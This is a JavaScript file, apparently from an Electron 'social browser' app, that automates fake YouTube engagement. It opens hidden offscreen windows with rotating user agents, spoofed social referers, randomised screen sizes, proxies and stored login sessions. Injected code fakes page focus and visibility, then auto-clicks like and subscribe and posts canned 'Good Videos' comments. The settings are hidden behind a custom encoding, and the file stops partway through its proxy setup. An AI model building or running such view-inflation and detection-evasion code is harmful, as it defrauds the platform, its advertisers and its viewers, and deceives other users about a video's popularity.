(function (w) {
  console.log(' [ youtube-manager script ] ');

  if (w.MYSERVERYOUTUBESCRIPT_LOADED) {
    console.log('MYSERVERYOUTUBESCRIPT Aborting 0 ...');
    return;
  }

  w.MYSERVERYOUTUBESCRIPT_LOADED = true;
  w.MYSERVERYOUTUBESCRIPT = true;

  SOCIALBROWSER.var.blocking.youtube.quality = {
    name: 'medium',
    value: '360',
  };
  SOCIALBROWSER.youtubeManager = {
    currentIndex: -1,
    sleep: 1000 * 60 * 10,
    visitOptions: {
      subscribe: false,
      like: false,
      comment: false,
      unlike: false,
      report: false,
      show: false,
      type: '',
      timeout: 1000 * 60 * 5,
      title: 'No Title',
      url: 'https://bit.ly/3aBjyoX',
      host: 'youtube',
      referer: 'social',
      proxy: null,
      partition: null,
      scroll: false,
      count: 1,
      ip: '127.0.0.1',
      group: 1000,
    },
    trackingList: [],
    visitList: [
      { subscribe: true, like: true, title: 'games 1', url: 'https://www.youtube.com/watch?v=QHxnv_m0Mhc', timeout: 1000 * 60 * 20, group: 4 },
      { subscribe: true, like: true, title: 'games 1', url: 'https://www.youtube.com/watch?v=0C76U8FK0Jw', timeout: 1000 * 60 * 20, group: 4 },
      { subscribe: true, like: true, title: 'games 1', url: 'https://www.youtube.com/watch?v=QlaWLQRSIWA', timeout: 1000 * 60 * 20, group: 4 },
      { subscribe: true, like: true, title: 'games 1', url: 'https://www.youtube.com/watch?v=cDad-ODVHpQ', timeout: 1000 * 60 * 20, group: 4 },
      { subscribe: true, like: true, title: 'games 1', url: 'https://www.youtube.com/watch?v=dvY89VddNJg', timeout: 1000 * 60 * 20, group: 4 },

      { subscribe: true, like: true, title: 'scripts now - download', url: 'https://www.youtube.com/watch?v=3r5sfMTv5WU', timeout: 1000 * 60 * 10, group: 3 },

      { subscribe: true, like: true, title: 'برنامج نقاط البيع - السعر والمميزات', url: 'https://www.youtube.com/watch?v=fV_Zqwm0EqU', timeout: 1000 * 60 * 60, group: 2 },
      { subscribe: true, like: true, title: 'برنامج نقاط البيع - تركيب وتشغيل', url: 'https://www.youtube.com/watch?v=xp8diif9jv4', timeout: 1000 * 60 * 30, group: 2 },
      { subscribe: true, like: true, title: 'برنامج نقاط البيع - الاعدادات', url: 'https://www.youtube.com/watch?v=_6rkjiXg2B8', timeout: 1000 * 60 * 60, group: 2 },

      { subscribe: true, like: true, title: 'ازاى شركات السوشيال ميديا بتزود عدد وساعات المشاهدة ', url: 'https://www.youtube.com/watch?v=B9ufyrmBrQ4', timeout: 1000 * 60 * 25, group: 5 },
      { subscribe: true, like: true, title: 'زيادة مشاهدات اليوتيوب addmefast', url: 'https://www.youtube.com/watch?v=_Y8gawCe7mU', timeout: 1000 * 60 * 15, group: 1 },
      { subscribe: true, like: true, title: 'ازاى المواقع بتعرف انت مين', url: 'https://www.youtube.com/watch?v=PpDoLqPZg5M', timeout: 1000 * 60 * 20, group: 1 },
      { subscribe: true, like: true, title: 'متصفح لحماية الاطفال ومانع للاعلانات', url: 'https://www.youtube.com/watch?v=fWCW1nyJ4u4', timeout: 1000 * 60 * 15, group: 1 },
      { subscribe: true, like: true, title: 'wintube com | sites scam on users', url: 'https://www.youtube.com/watch?v=FYgADc0pF4k', timeout: 1000 * 60 * 10, group: 1 },
      { subscribe: true, like: true, title: 'SQL Server Query ', url: 'https://www.youtube.com/watch?v=dMmz0GJYYA0', timeout: 1000 * 60 * 50, group: 1 },
      { subscribe: true, like: true, title: 'mvc api fetch', url: 'https://www.youtube.com/watch?v=LkFhaYtgBTo', timeout: 1000 * 60 * 15, group: 1 },
      { subscribe: true, like: true, title: 'FrontEnd', url: 'https://www.youtube.com/watch?v=9VOhC0x0ju4', timeout: 1000 * 60 * 35, group: 1 },
      { subscribe: true, like: true, title: 'nodejs chat', url: 'https://www.youtube.com/watch?v=XrCUM6vInH4', timeout: 1000 * 60 * 35, group: 1 },
      { subscribe: true, like: true, title: 'MVC 5 Review', url: 'https://www.youtube.com/watch?v=4mVIE94MKDk', timeout: 1000 * 60 * 30, group: 1 },
      { subscribe: true, like: true, title: 'c# Review', url: 'https://www.youtube.com/watch?v=oBRHb2A1sXk', timeout: 1000 * 60 * 60, group: 1 },
      { subscribe: true, like: true, title: 'c# winforms Review', url: 'https://www.youtube.com/watch?v=GE2KtKpACYI', timeout: 1000 * 60 * 60, group: 1 },
      { subscribe: true, like: true, title: 'sharepoint admin 2016', url: 'https://www.youtube.com/watch?v=ei130-_UKI4', timeout: 1000 * 60 * 60, group: 1 },
    ],
    socialRefererList: [
      'https://www.facebook.com/',
      'https://quora.com/',
      'https://medium.com/',
      'https://twitter.com/',
      'https://web.whatsapp.com/',
      'https://www.instagram.com/',
      'https://www.pinterest.com/',
      'https://www.reddit.com/',
      'https://www.tumblr.com/',
      'https://www.tiktok.com/',
      'https://flipboard.com/',
      'https://vk.com/',
      'https://getpocket.com/',
      'https://digg.com/video',
      'https://www.linkedin.com/',
      'https://web.wechat.com/',
    ],
    externalRefererList: [
      { url: 'https://mostaql.com/portfolio/973541' },
      { url: 'https://mostaql.com/portfolio/869525' },
      { url: 'https://mostaql.com/portfolio/606817' },
      { url: 'https://mostaql.com/portfolio/604044' },
      { url: 'https://mostaql.com/portfolio/602346' },
      { url: 'https://mostaql.com/portfolio/602345' },
      { url: 'https://mostaql.com/portfolio/602341' },
      { url: 'https://mostaql.com/portfolio/367586' },
      { url: 'https://mostaql.com/portfolio/366708' },
      { url: 'https://mostaql.com/portfolio/29249' },
    ],
    userAgentList: [
      { url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' },
      { url: 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' },
      { url: 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' },
      { url: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' },
      { url: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' },
      { url: 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/108.0.5359.52 Mobile/15E148 Safari/604.1' },
      { url: 'Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/108.0.5359.52 Mobile/15E148 Safari/604.1' },
      { url: 'Mozilla/5.0 (iPod; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/108.0.5359.52 Mobile/15E148 Safari/604.1' },
      { url: 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36' },
      { url: 'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36' },
      { url: 'Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36' },
      { url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0' },
      { url: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.0; rv:107.0) Gecko/20100101 Firefox/107.0' },
      { url: 'Mozilla/5.0 (X11; Linux i686; rv:107.0) Gecko/20100101 Firefox/107.0' },
      { url: 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/107.0 Mobile/15E148 Safari/605.1.15' },
      { url: 'Mozilla/5.0 (iPad; CPU OS 13_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/107.0 Mobile/15E148 Safari/605.1.15' },
      { url: 'Mozilla/5.0 (Android 13; Mobile; rv:68.0) Gecko/68.0 Firefox/107.0' },
      { url: 'Mozilla/5.0 (Android 13; Mobile; LG-M255; rv:107.0) Gecko/107.0 Firefox/107.0' },
      { url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.42' },
      { url: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.42' },
      { url: 'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36 EdgA/107.0.1418.62' },
      { url: 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 EdgiOS/107.1418.62 Mobile/15E148 Safari/605.1.15' },
      { url: 'Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 Edge/40.15254.603' },
      { url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/93.0.4585.21' },
      { url: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/93.0.4585.21' },
      { url: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/93.0.4585.21' },
      { url: 'Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36 OPR/63.3.3216.58675' },
      { url: 'Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36 OPR/63.3.3216.58675' },
    ],
    scrrenSizeList: [
      '2560x1440',
      '1920x1080',
      '1792x1120',
      '1680x1050',
      '1600x900',
      '1536x864',
      '1440x900',
      '1366x768',
      '1280x800',
      '1280x720',
      '1024x768',
      '1024x600',
      '962x601',
      '810x1080',
      '800x1280',
      '768x1024',
      '601x962',
      '600x1024',
      '414x896',
      '390x844',
      '360x800',
      '360x640',
    ],
    screenIndex: -1,
    randomScreenSize: function () {
      if (SOCIALBROWSER.youtubeManager.scrrenSizeList.length > 0) {
        SOCIALBROWSER.youtubeManager.screenIndex++;
        if (SOCIALBROWSER.youtubeManager.scrrenSizeList.length <= SOCIALBROWSER.youtubeManager.screenIndex) {
          SOCIALBROWSER.youtubeManager.screenIndex = 0;
        }
        return SOCIALBROWSER.youtubeManager.scrrenSizeList[SOCIALBROWSER.youtubeManager.screenIndex];
      } else {
        return '1366x768';
      }
    },
    agentIndex: -1,
    randomUserAgent: function () {
      if (SOCIALBROWSER.youtubeManager.userAgentList.length > 0) {
        SOCIALBROWSER.youtubeManager.agentIndex++;
        if (SOCIALBROWSER.youtubeManager.userAgentList.length <= SOCIALBROWSER.youtubeManager.agentIndex) {
          SOCIALBROWSER.youtubeManager.agentIndex = 0;
        }
        return SOCIALBROWSER.youtubeManager.userAgentList[SOCIALBROWSER.youtubeManager.agentIndex];
      } else {
        return null;
      }
    },
    socialRefererIndex: -1,
    getSocialReferer: function () {
      if (SOCIALBROWSER.youtubeManager.socialRefererList.length > 0) {
        SOCIALBROWSER.youtubeManager.socialRefererIndex++;
        if (SOCIALBROWSER.youtubeManager.socialRefererList.length <= SOCIALBROWSER.youtubeManager.socialRefererIndex) {
          SOCIALBROWSER.youtubeManager.socialRefererIndex = 0;
        }
        return SOCIALBROWSER.youtubeManager.socialRefererList[SOCIALBROWSER.youtubeManager.socialRefererIndex];
      } else {
        return 'https://www.facebook.com/';
      }
    },
    externaRefererIndex: -1,
    getExternalReferer: function () {
      if (SOCIALBROWSER.youtubeManager.externalRefererList.length > 0) {
        SOCIALBROWSER.youtubeManager.externaRefererIndex++;
        if (SOCIALBROWSER.youtubeManager.externalRefererList.length <= SOCIALBROWSER.youtubeManager.externaRefererIndex) {
          SOCIALBROWSER.youtubeManager.externaRefererIndex = 0;
        }
        return SOCIALBROWSER.youtubeManager.externalRefererList[SOCIALBROWSER.youtubeManager.externaRefererIndex].url;
      } else {
        return 'https://www.egytag.com/';
      }
    },
    userIndex: -1,
    GetRealPartition: function () {
      if (SOCIALBROWSER.var.session_list.length > 0) {
        SOCIALBROWSER.youtubeManager.userIndex++;
        if (SOCIALBROWSER.var.session_list.length <= SOCIALBROWSER.youtubeManager.userIndex) {
          SOCIALBROWSER.youtubeManager.userIndex = 0;
        }
        return SOCIALBROWSER.var.session_list[SOCIALBROWSER.youtubeManager.userIndex].name;
      } else {
        return 'ghost_' + Date.now();
      }
    },
    getNewVisit: function () {
      if (SOCIALBROWSER.youtubeManager.visitList.length > 0) {
        SOCIALBROWSER.youtubeManager.currentIndex++;
        if (SOCIALBROWSER.youtubeManager.visitList.length <= SOCIALBROWSER.youtubeManager.currentIndex) {
          SOCIALBROWSER.youtubeManager.currentIndex = -1;
          return null;
        }
        return SOCIALBROWSER.youtubeManager.visitList[SOCIALBROWSER.youtubeManager.currentIndex];
      } else {
        return null;
      }
    },
    prepareVisits: function () {
      SOCIALBROWSER.fetchJson(
        {
          url: SOCIALBROWSER.server_url + '/api/youtube_list',
          method: 'GET',
        },
        function (data) {
          if (data.done && data.list && data.list.length > 0) {
            if (data.reset) {
              SOCIALBROWSER.youtubeManager.trackingList = [];
            }
            SOCIALBROWSER.youtubeManager.visitList = [];
            data.list.forEach((v) => {
              SOCIALBROWSER.youtubeManager.visitList.push({ ...v });
              SOCIALBROWSER.youtubeManager.visitList.push({ url: 'https://social-browser.com/api/youtube_support_video', type: 'support', timeout: 1000 * 60 * 10 });
            });
          }
        }
      );
    },
    prepareExternalReferer: function () {
      SOCIALBROWSER.fetchJson(
        {
          url: SOCIALBROWSER.server_url + '/api/externlRefererList',
          method: 'GET',
        },
        function (data) {
          if (data.done && data.list && data.list.length > 0) {
            SOCIALBROWSER.youtubeManager.externalRefererList = [];
            data.list.forEach((v) => {
              SOCIALBROWSER.youtubeManager.externalRefererList.push(v);
            });
          }
        }
      );
    },
  };

  SOCIALBROWSER.youtubeManager.openFakeViewWindow = function (op) {
    let options = { ...SOCIALBROWSER.youtubeManager.visitOptions, ...op };
    options.preload = SOCIALBROWSER.dir + '/browser_files/js/context-menu.js';
    options.userAgent = options.userAgent || SOCIALBROWSER.youtubeManager.randomUserAgent().url;
    options.screenSize = SOCIALBROWSER.youtubeManager.randomScreenSize().split('x');

    if (!options.partition) {
      options.partition = SOCIALBROWSER.youtubeManager.GetRealPartition();
    } else if (options.partition === 'user') {
      options.partition = 'persist:user_' + new Date().getMinutes();
    } else if (options.partition === 'ghost') {
      options.partition = 'ghost_' + new Date().getTime();
    }

    if (options.referer == 'direct') {
      options.referer = options.url;
    } else if (options.referer == 'external') {
      options.referer = SOCIALBROWSER.youtubeManager.getExternalReferer();
    } else if (options.referer == 'social') {
      options.referer = SOCIALBROWSER.youtubeManager.getSocialReferer();
    }

    let code_injected = `window.fakeview123 = '${SOCIALBROWSER.to123(options)}';`;
    code_injected += `console.log = function () {};

if (!window.SOCIALBROWSER) {
  window.SOCIALBROWSER = {
    session: {
      privacy: {
        vpc: {},
      },
    },
    var: {
      core: { id: '' },
      blocking: {
        javascript: {},
        popup: {},
        core: {},
        youtube: {},
      },
    },
    isIframe: () => {
      try {
        return window.self !== window.top;
      } catch (e) {
        return true;
      }
    },
  };
}
SOCIALBROWSER.url = SOCIALBROWSER.url || require('url');
SOCIALBROWSER.var.blocking.javascript.block_window_open = true;
SOCIALBROWSER.var.blocking.popup.allow_external = false;
SOCIALBROWSER.var.blocking.popup.allow_internal = false;
SOCIALBROWSER.__define = function (o, p, v, op) {
  try {
    op = op || {};
    if (typeof o == 'undefined') {
      return;
    }
    Object.defineProperty(o, p, {
      get: function () {
        return v;
      },
      enumerable: op.enumerable || false,
    });
    if (o.prototype) {
      o.prototype[p] = v;
    }
  } catch (error) {
    console.log(error);
  }
};

SOCIALBROWSER.getOffset = function (el) {
  const rect = el.getBoundingClientRect();
  let factor = SOCIALBROWSER.currentWindow.webContents.zoomFactor || 1;
  return {
    x: Math.round(rect.left * factor + (el.clientWidth / 2) * factor),
    y: Math.round(rect.top * factor + (el.clientHeight / 2) * factor),
  };
};

SOCIALBROWSER.click = function (selector) {
  if (!selector) {
    return false;
  }
  let dom = typeof selector === 'string' ? SOCIALBROWSER.$(selector) : selector;
  if (dom) {
    dom.scrollIntoView();
    if (window.scrollY == 0) {
    } else if (window.innerHeight + window.scrollY >= document.body.scrollHeight) {
    } else {
      window.scroll(window.scrollX, window.scrollY - dom.clientHeight);
    }

    if (SOCIALBROWSER.currentWindow && SOCIALBROWSER.webContents) {
      let offset = SOCIALBROWSER.getOffset(dom);
      SOCIALBROWSER.currentWindow.focus();
      SOCIALBROWSER.webContents.sendInputEvent({ type: 'mouseDown', x: offset.x, y: offset.y, button: 'left', clickCount: 1 });
      SOCIALBROWSER.webContents.sendInputEvent({ type: 'mouseUp', x: offset.x, y: offset.y, button: 'left', clickCount: 1 });
      console.log('clicked : ', offset);
      return dom;
    } else {
      SOCIALBROWSER.triggerMouseEvent(dom, 'mousedown');
      SOCIALBROWSER.triggerMouseEvent(dom, 'mouseup');
      return dom;
    }
  }
};

window.open = function (url) {
  console.log(' code0 [ window.open ] ' + url);
  if (!url || url == 'about:blank') {
    return;
  }
  setTimeout(function () {
    document.location.href = url;
  }, 3 * 1000);
};

localStorage.clear = () => {
  console.log('User Request Clear LocalStorage');
};

if (!SOCIALBROWSER.from123) {
  SOCIALBROWSER.$base64Letter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
  SOCIALBROWSER.$base64Numbers = [];
  for (let $i = 11; $i < 99; $i++) {
    if ($i % 10 !== 0 && $i % 11 !== 0) {
      SOCIALBROWSER.$base64Numbers.push($i);
    }
  }

  SOCIALBROWSER.toJson = (obj) => {
    if (typeof obj === undefined || obj === null) {
      return '';
    }
    return JSON.stringify(obj);
  };

  SOCIALBROWSER.fromJson = (str) => {
    if (typeof str !== 'string') {
      return str;
    }
    return JSON.parse(str);
  };

  SOCIALBROWSER.toBase64 = (str) => {
    if (typeof str === undefined || str === null || str === '') {
      return '';
    }
    if (typeof str !== 'string') {
      str = SOCIALBROWSER.toJson(str);
    }
    return btoa(unescape(encodeURIComponent(str)));
  };

  SOCIALBROWSER.fromBase64 = (str) => {
    if (typeof str === undefined || str === null || str === '') {
      return '';
    }
    return decodeURIComponent(escape(atob(str)));
  };

  SOCIALBROWSER.to123 = (data) => {
    data = SOCIALBROWSER.toBase64(data);
    let newData = '';
    for (let i = 0; i < data.length; i++) {
      let letter = data[i];
      newData += SOCIALBROWSER.$base64Numbers[SOCIALBROWSER.$base64Letter.indexOf(letter)];
    }
    return newData;
  };

  SOCIALBROWSER.from123 = (data) => {
    let newData = '';
    for (let i = 0; i < data.length; i++) {
      let num = data[i] + data[i + 1];
      let index = SOCIALBROWSER.$base64Numbers.indexOf(parseInt(num));
      newData += SOCIALBROWSER.$base64Letter[index];
      i++;
    }
    newData = SOCIALBROWSER.fromBase64(newData);
    return newData;
  };

  SOCIALBROWSER.typeOf = SOCIALBROWSER.typeof = function type(elem) {
    return Object.prototype.toString.call(elem).slice(8, -1);
  };
}

if (window.fakeview123) {
  SOCIALBROWSER.fakeview = JSON.parse(SOCIALBROWSER.from123(window.fakeview123));
  delete window.fakeview123;
}

if (!SOCIALBROWSER.fakeview) {
  SOCIALBROWSER.fakeview = {
    url: 'http://social-browser.com/api/youtube_random_video',
    referer: 'https://www.olx.com.eg/',
    like: true,
    subscribe: true,
    scroll: false,
  };
}

if (!SOCIALBROWSER.isIframe() && SOCIALBROWSER.fakeview.scroll) {
  function scrollRandom() {
    if (SOCIALBROWSER.scrollStop) {
      return;
    }

    let y = window.scrollY;
    y = y + (Math.floor(Math.random() * 150) + 50);
    if (document.body && window.innerHeight + window.scrollY >= document.body.offsetHeight) {
      y = 0;
      document.documentElement.scrollTop = 0;
    }
    window.scrollTo(0, y);

    setTimeout(() => {
      scrollRandom();
    }, 1000 * (Math.floor(Math.random() * 5) + 1));
  }

  setTimeout(() => {
    scrollRandom();
  }, 1000 * 20);
}
if (!SOCIALBROWSER.session.privacy.vpc.set_window_active) {
  document.__proto__.hasFocus = function () {
    return true;
  };
  SOCIALBROWSER.__define(document, 'hidden ', false);
  SOCIALBROWSER.__define(document, 'mozHidden ', false);
  SOCIALBROWSER.__define(document, 'webkitHidden ', false);
  SOCIALBROWSER.__define(document, 'visibilityState ', 'visible');
  SOCIALBROWSER.blockEvent = (e) => {
    e.preventDefault();
    e.stopPropagation();
    e.stopImmediatePropagation();
  };
  document.addEventListener('visibilitychange', SOCIALBROWSER.blockEvent, true);
  document.addEventListener('webkitvisibilitychange', SOCIALBROWSER.blockEvent, true);
  document.addEventListener('mozvisibilitychange', SOCIALBROWSER.blockEvent, true);
  document.addEventListener('hasFocus', SOCIALBROWSER.blockEvent, true);
  document.addEventListener('blur', SOCIALBROWSER.blockEvent, true);
  window.addEventListener('blur', SOCIALBROWSER.blockEvent, true);
  window.addEventListener('mouseleave', SOCIALBROWSER.blockEvent, true);
  setInterval(() => {
    window.onpagehide = window.onblur = document.onfocusout = null;
  }, 1000);
}

if (SOCIALBROWSER.fakeview.screenSize) {
  SOCIALBROWSER.session.privacy.vpc.screen_width = parseInt(SOCIALBROWSER.fakeview.screenSize[0]);
  SOCIALBROWSER.session.privacy.vpc.screen_availWidth = parseInt(SOCIALBROWSER.fakeview.screenSize[0]);
  SOCIALBROWSER.session.privacy.vpc.screen_height = parseInt(SOCIALBROWSER.fakeview.screenSize[1]);
  SOCIALBROWSER.session.privacy.vpc.screen_availHeight = parseInt(SOCIALBROWSER.fakeview.screenSize[1]);
  if (!SOCIALBROWSER.screenHidden) {
    SOCIALBROWSER.__define(window, 'innerWidth', SOCIALBROWSER.session.privacy.vpc.screen_width);
    SOCIALBROWSER.__define(window, 'innerHeight', SOCIALBROWSER.session.privacy.vpc.screen_height);
    SOCIALBROWSER.__define(window, 'outerWidth', SOCIALBROWSER.session.privacy.vpc.screen_width);
    SOCIALBROWSER.__define(window, 'outerHeight', SOCIALBROWSER.session.privacy.vpc.screen_height);
  }
}

SOCIALBROWSER.var.blocking.core.block_empty_iframe = false;
SOCIALBROWSER.var.blocking.core.remove_external_iframe = false;

SOCIALBROWSER.customSetting = SOCIALBROWSER.customSetting || {};

if (SOCIALBROWSER.var.core.id.like('*test*')) {
  SOCIALBROWSER.customSetting.allowMenu = true;
}

SOCIALBROWSER.currentWindow.showInactive();
` + `console.log(' [ YOUTUBE ] ');
if (document.title == '504 Gateway Time-out') {
  console.log('Error : 504 Gateway Time-out');
  console.log('Page Will Reload');
  setTimeout(() => {
    document.location.reload();
  }, 1000 * 15);

  return;
}

if (SOCIALBROWSER && SOCIALBROWSER.var) {
  SOCIALBROWSER.var.blocking.core = SOCIALBROWSER.var.blocking.core || {};
  SOCIALBROWSER.var.blocking.core.skip_video_ads = false;
  SOCIALBROWSER.var.blocking.youtube = SOCIALBROWSER.var.blocking.youtube || {};
  SOCIALBROWSER.var.blocking.youtube.skip_ads = false;
}

window.open = function () {
  return {};
};

function __document__ready__() {
  if (document.location.host.indexOf('youtu') == -1) {
    let body = document.querySelector('body');
    if (body && !document.querySelector('#__a_injected')) {
      let a = document.createElement('a');
      a.href = SOCIALBROWSER.fakeview.url;
      a.id = '__a_injected';
      a.innerHTML = SOCIALBROWSER.fakeview.url;
      a.setAttribute('target', '_self');

      body.appendChild(a);
      a.style.backgroundColor = 'red';
      a.style.color = '#ffffff';
      a.style.fontSize = '22px';
      a.scrollIntoView();

      setTimeout(function () {
        document.querySelector('#__a_injected').click();
      }, 5 * 1000);
    }

    setTimeout(function () {
      document.location.href = SOCIALBROWSER.fakeview.url;
    }, 30 * 1000);
  } else {
    SOCIALBROWSER.YOUTUBE = {
      PLAYER: '#movie_player',
      SUBSCRIBE_BUTTON: '#subscribe-button > ytd-subscribe-button-renderer > tp-yt-paper-button',
      LIKE_BUTTON: 'ytd-video-primary-info-renderer #top-level-buttons-computed > ytd-toggle-button-renderer:nth-child(1)',
      DISLIKE_BUTTON: 'ytd-video-primary-info-renderer #top-level-buttons-computed > ytd-toggle-button-renderer:nth-child(2)',
      NOTIFICATION: 'ytd-popup-container',
      LIKE_BUTTON_CLICKED_CLASS: 'style-default-active',
      COMMENT_BOX: 'ytd-comment-simplebox-renderer #simplebox-placeholder',
      COMMENT_SUBMIT: '#buttons #submit-button',
      isUserLogin: function () {
        return document.querySelector('a[href^="https://accounts.google.com/ServiceLogin"]') ? false : true;
      },
      scrollDown: function () {
        let y = window.scrollY + 50;
        window.scrollTo(0, y);
      },
      scrollUp: function () {
        let y = window.scrollY - 50;
        window.scrollTo(0, y);
      },
      comment: function () {
        if ((box = document.querySelector(SOCIALBROWSER.YOUTUBE.COMMENT_BOX))) {
          box.scrollIntoView(false);
          box.click();
          let old_copy = SOCIALBROWSER.remote.clipboard.readText();
          SOCIALBROWSER.remote.clipboard.writeText('Good Videos');
          SOCIALBROWSER.webContents.paste();
          setTimeout(() => {
            if ((submit = document.querySelector(SOCIALBROWSER.YOUTUBE.COMMENT_SUBMIT))) {
              submit.scrollIntoView(false);
              submit.click();
            }
            SOCIALBROWSER.remote.clipboard.writeText(old_copy);
          }, 1000 * 5);
        } else {
          SOCIALBROWSER.YOUTUBE.scrollDown();
          setTimeout(() => {
            SOCIALBROWSER.YOUTUBE.comment();
          }, 1000);
        }
      },
      isSubscribed: function () {
        let subscribeButton = document.querySelector(SOCIALBROWSER.YOUTUBE.SUBSCRIBE_BUTTON);
        if (!subscribeButton) {
          return false;
        }
        const subscribed = subscribeButton.hasAttribute('subscribed');
        return subscribed;
      },
      subscribe: function () {
        let subscribeButton = document.querySelector(SOCIALBROWSER.YOUTUBE.SUBSCRIBE_BUTTON);
        if (!subscribeButton) {
          return false;
        }
        let subscribed = subscribeButton.hasAttribute('subscribed');
        if (subscribed) {
          return true;
        } else {
          subscribeButton.click();
          return true;
        }
      },
      like: function () {
        const likeButton = document.querySelector(SOCIALBROWSER.YOUTUBE.LIKE_BUTTON);
        if (!likeButton) {
          return false;
        }
        if (likeButton.classList.contains(SOCIALBROWSER.YOUTUBE.LIKE_BUTTON_CLICKED_CLASS)) {
          return true;
        } else {
          likeButton.click();
          return true;
        }
      },
    };

    SOCIALBROWSER.var.blocking.core.skip_video_ads = false;
    SOCIALBROWSER.var.blocking.youtube.skip_ads = false;
    SOCIALBROWSER.var.blocking.youtube.quality = {
      name: 'medium',
      value: '360',
    };

    setInterval(() => {
      if (SOCIALBROWSER.YOUTUBE.isUserLogin()) {
        if (SOCIALBROWSER.fakeview.like) {
          SOCIALBROWSER.YOUTUBE.like();
        }
        if (SOCIALBROWSER.fakeview.subscribe) {
          SOCIALBROWSER.YOUTUBE.subscribe();
        }
      }
    }, 1000 * 60 * 3);

    setInterval(() => {
      if (SOCIALBROWSER.video_player) {
        SOCIALBROWSER.video_player.playVideo();
      }

      document.querySelectorAll('ytd-consent-bump-v2-lightbox a.yt-simple-endpoint.style-scope.yt-button-renderer').forEach((d, i) => {
        if (i == 0) {
          d.click();
        }
      });

      document.querySelectorAll('iron-overlay-backdrop').forEach((d) => d.remove());
      document.querySelectorAll('#dialog').forEach((d) => d.remove());

      if (document.location.href.indexOf('consent') !== -1) {
        let btn = document.querySelector('form input[type=submit]') || document.querySelector('form button');
        if (btn) {
          btn.click();
        }
      }
    }, 1000 * 5);

    if (SOCIALBROWSER.setPlaybackQuality) {
      SOCIALBROWSER.setPlaybackQuality();
    }
  }
}

if (document.readyState !== 'loading') {
  __document__ready__();
} else {
  document.addEventListener('DOMContentLoaded', () => {
    __document__ready__();
  });
}
`;

    if (SOCIALBROWSER.var.core.version > '2022.12.01') {
      console.log('New Youtube Manager ..........................................');
      SOCIALBROWSER.ipc('[open new popup]', {
        timeout: options.timeout,
        url: options.referer,
        partition: options.partition,
        userAgent: options.userAgent,
        proxy: options.proxy,
        referrer: options.referer,
        show: false,
        width: parseInt(options.screenSize[0] || '1366'),
        height: parseInt(options.screenSize[1] || '768'),
        x: 4000,
        y: 4000,
        alwaysOnTop : false,
        allowAudio: false,
        allowDownload: false,
        allowAds: true,
        allowMenu: SOCIALBROWSER.var.core.id.like('*test*'),
        allowNewWindows: false,
        allowSaveUserData: false,
        allowSaveUrls: false,
        security: false,
        eval: code_injected,
      });
    } else {
      let win = new SOCIALBROWSER.remote.BrowserWindow({
        show: false,
        width: parseInt(options.screenSize[0] || '1366'),
        height: parseInt(options.screenSize[1] || '768'),
        x: 4000,
        y: 4000,
        skipTaskbar: true,
        webPreferences: {
          sandbox: false,
          contextIsolation: false,
          enableRemoteModule: true,
          nodeIntegrationInSubFrames: false,
          partition: options.partition,
          webaudio: false,
          webSecurity: true,
          allowRunningInsecureContent: false,
          preload: options.preload,
        },
      });

      win.webContents.audioMuted = true;

      win.webContents.userAgent = options.userAgent;
      win.setMenuBarVisibility(false);

      if (options.proxy) {
        const ss = win.webContents.session;
        ss.setProxy(
          {
